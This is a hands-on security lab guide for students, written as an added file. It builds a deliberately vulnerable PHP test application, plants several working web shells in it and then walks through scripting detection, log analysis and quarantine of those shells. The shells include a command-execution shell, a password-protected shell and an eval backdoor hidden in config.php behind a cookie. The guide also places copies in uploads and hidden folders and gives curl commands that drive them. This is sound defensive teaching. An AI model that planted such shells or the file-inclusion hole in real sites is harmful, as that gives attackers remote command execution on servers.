@@ -1,0 +1,431 @@
+ Web Shell Persistence and Detection
+Objectives
+By the end of this lab, students will be able to:
+
+Understand web shell concepts and their role in persistence attacks
+Deploy and identify different types of web shells in web environments
+Create detection scripts using file-based and log-based analysis
+Implement automated removal and quarantine procedures
+Develop monitoring solutions for ongoing web shell detection
+Prerequisites
+Before starting this lab, students should have:
+
+Basic Linux command line proficiency
+Understanding of web server concepts (Apache/Nginx)
+Familiarity with PHP syntax and web application structure
+Basic Bash scripting knowledge
+Lab Environment
+Al Nafi provides Linux-based cloud machines for this lab. Click Start Lab to access your pre-configured environment.
+
+Your lab machine includes:
+
+Ubuntu Linux with Apache web server
+PHP 7.4+ enabled
+Log analysis tools (grep, awk, sed)
+Text editors (nano, vim)
+Pre-configured web directories
+Task 1: Setting Up the Test Environment
+Step 1.1: Configure Apache and Create Web Directory
+Verify Apache is running and create a test web application directory:
+
+# Start and enable Apache
+sudo systemctl start apache2
+sudo systemctl status apache2
+
+# Create test application directory
+sudo mkdir -p /var/www/html/testapp
+sudo chown -R www-data:www-data /var/www/html/testapp
+sudo chmod 755 /var/www/html/testapp
+Step 1.2: Create Vulnerable Web Application
+Create a simple vulnerable PHP application:
+
+sudo tee /var/www/html/testapp/index.php > /dev/null << 'EOF'
+<?php
+// TODO: This is intentionally vulnerable for educational purposes
+echo "<h1>Test Application</h1>";
+echo "<form method='GET' action=''>
+        <input type='text' name='page' placeholder='Page name'>
+        <input type='submit' value='Load'>
+      </form>";
+
+if(isset($_GET['page'])) {
+    $page = $_GET['page'];
+    // Vulnerable file inclusion
+    if(file_exists($page . ".php")) {
+        include($page . ".php");
+    }
+}
+?>
+EOF
+Step 1.3: Create Legitimate Pages
+# Create about page
+sudo tee /var/www/html/testapp/about.php > /dev/null << 'EOF'
+<?php
+echo "<h2>About Us</h2>";
+echo "<p>Legitimate content page.</p>";
+?>
+EOF
+
+# Create contact page
+sudo tee /var/www/html/testapp/contact.php > /dev/null << 'EOF'
+<?php
+echo "<h2>Contact</h2>";
+echo "<p>Email: contact@example.com</p>";
+?>
+EOF
+
+# Set permissions
+sudo chown -R www-data:www-data /var/www/html/testapp
+sudo chmod 644 /var/www/html/testapp/*.php
+Task 2: Creating Web Shell Examples
+Step 2.1: Create Basic Command Execution Shell
+Create a simple web shell for testing:
+
+sudo tee /var/www/html/testapp/shell_basic.php > /dev/null << 'EOF'
+<?php
+// Basic web shell - FOR EDUCATIONAL PURPOSES ONLY
+if(isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+}
+?>
+EOF
+Step 2.2: Create Advanced Web Shell
+Create a more sophisticated web shell with authentication:
+
+sudo tee /var/www/html/testapp/shell_advanced.php > /dev/null << 'EOF'
+<?php
+// Advanced web shell with authentication
+session_start();
+$password = "test123";
+
+if(!isset($_SESSION['auth']) && $_POST['pass'] != $password) {
+    echo '<form method="POST">
+            Password: <input type="password" name="pass">
+            <input type="submit">
+          </form>';
+    exit;
+}
+$_SESSION['auth'] = true;
+
+// TODO: Students should analyze this structure
+if(isset($_POST['cmd'])) {
+    echo "<pre>";
+    system($_POST['cmd']);
+    echo "</pre>";
+}
+
+echo '<form method="POST">
+        Command: <input type="text" name="cmd" size="50">
+        <input type="submit" value="Execute">
+      </form>';
+?>
+EOF
+Step 2.3: Create Stealth Web Shell
+Create a disguised web shell:
+
+sudo tee /var/www/html/testapp/config.php > /dev/null << 'EOF'
+<?php
+// Appears to be configuration file
+$db_host = "localhost";
+$db_user = "admin";
+$db_name = "testdb";
+
+// Hidden functionality
+if(isset($_COOKIE['debug']) && $_COOKIE['debug'] == 'true') {
+    if(isset($_POST['x'])) {
+        eval($_POST['x']);
+    }
+}
+
+$app_name = "Test Application";
+?>
+EOF
+Step 2.4: Deploy in Various Locations
+# Create uploads directory
+sudo mkdir -p /var/www/html/testapp/uploads
+sudo mkdir -p /var/www/html/testapp/.hidden
+
+# Copy shells to different locations
+sudo cp /var/www/html/testapp/shell_basic.php /var/www/html/testapp/uploads/image.php
+sudo cp /var/www/html/testapp/shell_advanced.php /var/www/html/testapp/.hidden/admin.php
+
+# Set permissions
+sudo chown -R www-data:www-data /var/www/html/testapp
+Task 3: Testing and Generating Activity
+Step 3.1: Test Web Shell Functionality
+# Test basic shell
+curl "http://localhost/testapp/shell_basic.php?cmd=whoami"
+curl "http://localhost/testapp/shell_basic.php?cmd=pwd"
+curl "http://localhost/testapp/shell_basic.php?cmd=id"
+Step 3.2: Generate Log Activity
+# Generate various access patterns
+for i in {1..5}; do
+    curl -s "http://localhost/testapp/shell_basic.php?cmd=ls" > /dev/null
+    curl -s "http://localhost/testapp/uploads/image.php?cmd=uname" > /dev/null
+done
+
+# Test stealth shell
+curl -s -b "debug=true" -d "x=phpinfo();" "http://localhost/testapp/config.php" > /dev/null
+
+echo "Activity generated in /var/log/apache2/access.log"
+Task 4: Creating Detection Scripts
+Step 4.1: File-Based Detection Script Template
+Create a detection script that students will complete:
+
+tee ~/webshell_detector.sh > /dev/null << 'EOF'
+#!/bin/bash
+
+# Web Shell Detection Script
+# TODO: Students complete the detection logic
+
+WEB_ROOT="/var/www/html"
+SUSPICIOUS_FUNCTIONS=("system" "exec" "shell_exec" "passthru" "eval" "base64_decode")
+
+detect_webshells() {
+    local directory=$1
+    echo "Scanning: $directory"
+    
+    # TODO: Implement file scanning logic
+    # HINT: Use find to locate PHP files
+    # HINT: Use grep to search for suspicious functions
+    # HINT: Check file permissions with stat
+    
+    find "$directory" -name "*.php" -type f | while read file; do
+        # TODO: Check for suspicious functions
+        # TODO: Check file permissions
+        # TODO: Check for encoded content
+        # TODO: Report findings
+        echo "Checking: $file"
+    done
+}
+
+# TODO: Scan for files in hidden directories
+# HINT: Use find with -path "*/.*"
+
+# TODO: Check for recently modified files
+# HINT: Use find with -mtime
+
+detect_webshells "$WEB_ROOT"
+EOF
+
+chmod +x ~/webshell_detector.sh
+Step 4.2: Log Analysis Script Template
+tee ~/log_analyzer.sh > /dev/null << 'EOF'
+#!/bin/bash
+
+# Log Analysis Script for Web Shell Detection
+# TODO: Students implement log analysis logic
+
+ACCESS_LOG="/var/log/apache2/access.log"
+
+analyze_logs() {
+    echo "=== Log Analysis ==="
+    
+    # TODO: Search for suspicious parameters
+    # HINT: grep -E "(cmd=|command=|exec=)"
+    
+    # TODO: Identify suspicious user agents
+    # HINT: Look for curl, wget, python
+    
+    # TODO: Find POST requests to PHP files
+    # HINT: grep "POST.*\.php"
+    
+    # TODO: Detect high-frequency requests from same IP
+    # HINT: Use awk to extract IPs, sort, uniq -c
+    
+    # TODO: Generate summary statistics
+    total_requests=$(wc -l < "$ACCESS_LOG")
+    echo "Total requests: $total_requests"
+}
+
+analyze_logs
+EOF
+
+chmod +x ~/log_analyzer.sh
+Step 4.3: Real-Time Monitoring Template
+tee ~/realtime_monitor.sh > /dev/null << 'EOF'
+#!/bin/bash
+
+# Real-Time Monitoring Script
+# TODO: Students implement monitoring logic
+
+ACCESS_LOG="/var/log/apache2/access.log"
+ALERT_LOG="~/webshell_alerts.log"
+
+monitor_logs() {
+    # TODO: Use tail -f to monitor log file
+    # TODO: Check each line for suspicious patterns
+    # TODO: Extract and log IP addresses
+    # TODO: Write alerts to alert log
+    
+    tail -f "$ACCESS_LOG" | while read line; do
+        # TODO: Implement detection logic
+        if echo "$line" | grep -qE "(cmd=|exec=)"; then
+            echo "[ALERT] Suspicious request detected"
+            # TODO: Log the alert
+        fi
+    done
+}
+
+# TODO: Implement file system monitoring
+# HINT: Use inotifywait to monitor directory changes
+
+monitor_logs
+EOF
+
+chmod +x ~/realtime_monitor.sh
+Task 5: Creating Removal and Remediation Scripts
+Step 5.1: Web Shell Removal Script Template
+tee ~/webshell_remover.sh > /dev/null << 'EOF'
+#!/bin/bash
+
+# Web Shell Removal Script
+# TODO: Students implement removal logic
+
+WEB_ROOT="/var/www/html"
+QUARANTINE_DIR="~/webshell_quarantine"
+BACKUP_DIR="~/webshell_backup_$(date +%Y%m%d_%H%M%S)"
+
+# Create directories
+mkdir -p "$QUARANTINE_DIR"
+mkdir -p "$BACKUP_DIR"
+
+quarantine_file() {
+    local file=$1
+    local reason=$2
+    
+    # TODO: Implement quarantine logic
+    # TODO: Create backup before moving
+    # TODO: Move file to quarantine
+    # TODO: Log the action
+    
+    echo "Quarantining: $file"
+}
+
+remove_webshells() {
+    # TODO: Scan for suspicious files
+    # TODO: Check for dangerous function combinations
+    # TODO: Identify files in suspicious locations
+    # TODO: Quarantine identified threats
+    
+    find "$WEB_ROOT" -name "*.php" -type f | while read file; do
+        # TODO: Implement detection and removal logic
+        echo "Checking: $file"
+    done
+}
+
+secure_directories() {
+    # TODO: Set proper permissions
+    # TODO: Create .htaccess protection
+    # TODO: Disable PHP execution in uploads
+    
+    echo "Securing directories..."
+}
+
+# Main execution
+echo "Web Shell Removal Tool"
+read -p "Continue? (y/N): " confirm
+
+if [[ $confirm == [yY] ]]; then
+    remove_webshells
+    secure_directories
+    echo "Removal complete. Check $QUARANTINE_DIR"
+fi
+EOF
+
+chmod +x ~/webshell_remover.sh
+Step 5.2: Verification Script Template
+tee ~/verify_cleanup.sh > /dev/null << 'EOF'
+#!/bin/bash
+
+# Cleanup Verification Script
+# TODO: Students implement verification checks
+
+WEB_ROOT="/var/www/html"
+
+verify_cleanup() {
+    echo "=== Cleanup Verification ==="
+    
+    # TODO: Scan for remaining suspicious files
+    # TODO: Check directory permissions
+    # TODO: Verify .htaccess protection
+    # TODO: Check recent log activity
+    # TODO: Generate verification report
+    
+    echo "Verification complete"
+}
+
+verify_cleanup
+EOF
+
+chmod +x ~/verify_cleanup.sh
+Task 6: Creating Monitoring Dashboard
+Step 6.1: Dashboard Script Template
+tee ~/webshell_dashboard.sh > /dev/null << 'EOF'
+#!/bin/bash
+
+# Web Shell Monitoring Dashboard
+# TODO: Students create comprehensive dashboard
+
+WEB_ROOT="/var/www/html"
+ACCESS_LOG="/var/log/apache2/access.log"
+
+display_dashboard() {
+    clear
+    echo "========================================"
+    echo "   Web Shell Monitoring Dashboard"
+    echo "========================================"
+    
+    # TODO: Display system status
+    # TODO: Show file statistics
+    # TODO: Display log statistics
+    # TODO: Calculate threat level
+    # TODO: Show recent alerts
+    
+    echo "Current Time: $(date)"
+}
+
+display_dashboard
+EOF
+
+chmod +x ~/webshell_dashboard.sh
+Expected Outcomes
+After completing this lab, students should have:
+
+Functional web shell detection scripts that identify suspicious PHP files
+Log analysis tools that detect web shell activity patterns
+Automated removal scripts with quarantine functionality
+Real-time monitoring capabilities for ongoing detection
+Understanding of web shell characteristics and behaviors
+Troubleshooting Tips
+Issue: Apache not starting
+
+Solution: Check if port 80 is already in use: sudo netstat -tlnp | grep :80
+Restart Apache: sudo systemctl restart apache2
+Issue: Permission denied when creating files
+
+Solution: Use sudo for operations in /var/www/html
+Verify ownership: ls -la /var/www/html
+Issue: Scripts not detecting web shells
+
+Solution: Verify web shells were created: ls -la /var/www/html/testapp
+Check script permissions: chmod +x ~/script_name.sh
+Test grep patterns manually: grep -E "system" /var/www/html/testapp/*.php
+Issue: Logs not showing activity
+
+Solution: Generate test traffic: curl http://localhost/testapp/shell_basic.php?cmd=whoami
+Check log location: ls -la /var/log/apache2/
+Verify Apache is logging: sudo tail -f /var/log/apache2/access.log
+Conclusion
+This lab provided hands-on experience with web shell persistence mechanisms and detection techniques. Students learned to identify web shells through file-based analysis, log examination, and behavioral patterns. The detection and removal scripts created in this lab form the foundation for real-world web shell incident response. Understanding these techniques is crucial for maintaining web application security and responding to compromise incidents.
+
+Key takeaways:
+
+Web shells use common PHP functions like system(), exec(), and eval()
+Detection requires both file system and log analysis
+Automated monitoring provides early warning of compromise
+Proper file permissions and .htaccess rules prevent web shell execution
+Regular scanning and verification ensure ongoing security
+Continue practicing by analyzing different web shell variants and improving detection accuracy.
